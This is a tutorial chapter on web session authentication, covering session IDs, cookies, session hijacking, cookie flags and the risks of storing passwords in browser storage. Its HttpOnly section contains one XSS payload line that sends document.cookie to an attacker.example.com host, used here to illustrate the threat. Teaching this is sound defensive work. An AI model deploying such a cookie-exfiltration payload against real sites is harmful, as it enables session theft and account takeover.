## The Problem

In the previous chapter, HTTPS encrypted communication.

So now our password is safe while traveling over the internet.

But there is still a problem.

Imagine you open Amazon.
```
1. Login
2. View Products
3. Add to Cart
4. View Orders
5. Logout
```
If every request required your username and password:
```
GET /products
username=alice
password=Password123

GET /carts
username=alice
password=Password123

GET /orders
username=alice
password=Password123
```
Imagine doing the above steps for 500 times while browsing.
Problems:
- Password sent repeatedly
- More chances to leak
- Bad performance

## The Question
Once the server verifies my password...

### Why should it ask again?
Exactly.
The server already knows who you are.
It only needs a way to remember you.
That is the birth of Sessions.

Simple diagram
```
Username
Password
       │
       ▼
Server verifies
       │
       ▼
Create Session
       │
       ▼
Generate Session ID
```
Example
```
Session ID
a7f84c9b12ef4567
```

The server stores
```
Session Table

+----------------------+--------+
| Session ID           | User   |
+----------------------+--------+
| a7f84c9b12ef4567     | Alice  |
+----------------------+--------+
```
The browser only receives
```
a7f84c9b12ef4567
```
The browser <b>does not receive Alice's information</b>.

It only receives a random identifier.

## Step-by-Step Flow
### Step 1
Alice logs in.
```
POST /login

{
    "username":"alice",
    "password":"Password123"
}
```
### Step 2
Server validates credentials.
```
Database

Alice
Password Hash
```
Password matches.

### Step 3
Server creates a session.
```
Random Session ID

9f3d81a4c5e8
```
Stores
```
Memory

9f3d81a4c5e8
        │
        ▼
Alice
```
### Step 4
Server sends
```
HTTP/1.1 200 OK

Set-Cookie:

SESSIONID=9f3d81a4c5e8
```
### Step 5
Browser stores cookie.
```
Chrome

Cookies

SESSIONID=9f3d81a4c5e8
```
### Step 6

User clicks

"My Orders"

Browser automatically sends
```
GET /orders

Cookie:

SESSIONID=9f3d81a4c5e8
```
##### Notice
No username.
No password.

### Step 7
Server checks
```
Session Table

9f3d81a4c5e8
        │
        ▼
Alice
```
Server immediately knows
```
Current User = Alice
```
## Visual Flow
```
                Login
                  │
                  ▼
      Username + Password
                  │
                  ▼
          Server Verifies
                  │
                  ▼
       Create Session ID
                  │
                  ▼
      Save in Session Store
                  │
                  ▼
      Send Cookie to Browser
                  │
                  ▼
         Browser Saves Cookie
                  │
                  ▼
 Every Request Automatically Sends Cookie
                  │
                  ▼
        Server Finds User

```

## Why UUID?
Imagine using
```
SESSIONID=1
```
An attacker tries
```
2
3
4
5
6
```
Eventually they discover another user's session.

Instead
```
f0f79fbc-fc35-4a9d-a867-b4df6c418340
```
is practically impossible to guess.

## Security Problem:
### Session Hijacking
Suppose the attacker steals
```
SESSIONID

f0f79fbc-fc35-4a9d-a867-b4df6c418340
```
Now they send
```
Cookie:

SESSIONID=f0f79fbc-fc35-4a9d-a867-b4df6c418340
```
Server says
```
Welcome Alice
```
The server cannot distinguish the attacker from Alice because possession of the valid session ID is enough.

### Solution
Always use
```
HTTPS
```
and configure cookies like:
```
HttpOnly
Secure
SameSite
```
HttpOnly: JavaScript cannot read the cookie, reducing theft through many XSS attacks.
<img width="680" height="417" alt="image5_1-1736522343104" src="https://github.com/user-attachments/assets/e95b2f84-9488-4584-8b0c-823579cdf729" />
```
new Image().src = 'https://attacker.example.com/?cookie=' + document.cookie;   
```
Secure: The browser sends the cookie only over HTTPS.
SameSite: Helps prevent the browser from sending the cookie on many cross-site requests, reducing CSRF risk.
<br>
<img width="680" height="408" alt="image1_1-1736522426323" src="https://github.com/user-attachments/assets/ad4025ba-16ba-4643-83e1-4d1869f77419" />
<br>
<br>
<br>

Now you guys can ask
> "Instead of creating sessions, why not store the username and password in the browser (Local Storage, Session Storage, or Cookies) and send them with every request?"

Technically, you can. In fact, this is very similar to HTTP Basic Authentication. But it has several serious security and usability problems.

Let's examine them one by one.

### Option 1: Store Username & Password in Browser

Imagine the browser stores:
```
localStorage.setItem("username", "alice")
localStorage.setItem("password", "Password123")
```
Every API call:
```
GET /profile

Username: alice
Password: Password123
```
This works.

But now let's see what goes wrong.

#### Problem 1: Password Travels on Every Request

Suppose you browse an e-commerce website.
```
Login
↓

View Products

↓

View Cart

↓

Orders

↓

Payment

↓

Profile

↓

Logout
```
That's maybe 100 API requests.

Your password is sent 100 times.
```
Password123
Password123
Password123
Password123
Password123
...
```
Even with HTTPS, you're unnecessarily exposing the password far more often than needed.

With sessions:
```
Password → One Time

↓

SessionID → 100 Requests
```
If a session ID is compromised, it can be invalidated.

If your password is compromised, you have to change it everywhere you reused it.

#### Problem 2: Password Never Changes

Suppose your password is
```
Password123
```
If someone steals it today,

they can still use it tomorrow...

next week...

next month...

until you change it.

A session can expire automatically.

Example:
```
Session

↓

30 Minutes

↓

Expired
```
Your password doesn't expire just because you stopped browsing.

#### Problem 3: Password Gives Full Control

Suppose an attacker steals
```
Username
Password
```
Now they can
```
Login

↓

Create New Sessions

↓

Change Email

↓

Change Password

↓

Delete Account
```
They own the account.

Suppose instead they steal only a session.
```
SessionID
```
The server can invalidate that session.
```
Delete Session

↓

Attacker Logged Out
```
Your actual password remains safe.

#### Problem 4: Browser Storage Isn't a Secure Vault

Suppose you store
```
localStorage.setItem("password","Password123")
```
Now imagine the website has an XSS (Cross-Site Scripting) vulnerability.

Malicious JavaScript runs:
```
const password = localStorage.getItem("password");
```
It sends it to the attacker.

Now your real password is gone.

This is one reason storing passwords in Local Storage is considered a very bad practice.

#### Problem 5: Password Reuse

Many users reuse passwords.

Example:
```
Amazon

Password123
Gmail

Password123
Facebook

Password123
```
Steal one password...

Compromise many accounts.

That's why protecting the password is so important.

#### Problem 6: Cannot Easily Logout Everywhere

Suppose your laptop is stolen.

If the browser stored your password,

the attacker can continue sending
```
Username

Password
```
The server has no simple way to reject those credentials except by changing the password.

With sessions:
```
Delete Session

↓

Done
```
The user doesn't need to change their password.
